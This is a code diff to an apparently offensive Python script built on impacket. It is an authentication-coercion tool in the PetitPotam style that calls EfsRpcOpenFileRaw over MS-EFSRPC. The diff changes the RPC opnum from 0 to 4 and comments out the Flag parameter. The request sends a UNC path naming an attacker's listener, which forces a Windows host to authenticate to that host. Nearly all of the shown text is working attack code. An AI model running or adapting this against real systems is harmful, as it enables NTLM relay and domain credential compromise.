@@ -16,7 +16,6 @@ from impacket.dcerpc.v5.dtypes import ULONG, WSTR
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.uuid import uuidtup_to_bin
 
-
 show_banner = '''
                                                                                                
               ___            _        _      _        ___            _                     
@@ -61,10 +60,10 @@ class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
 # RPC CALLS
 ################################################################################
 class EfsRpcOpenFileRaw(NDRCALL):
-    opnum = 0
+    opnum = 4
     structure = (
-        ('fileName', WSTR), 
-        ('Flag', ULONG),
+        ('fileName', WSTR),
+        # ('Flag', ULONG),
     )
     
 class EfsRpcOpenFileRawResponse(NDRCALL):
@@ -138,8 +137,8 @@ class CoerceAuth():
         try:
             request = EfsRpcOpenFileRaw()
             request['fileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
-            request['Flag'] = 0
-            #request.dump()
+            # request['Flag'] = 0
+            # request.dump()
             resp = dce.request(request)
             
         except Exception as e:
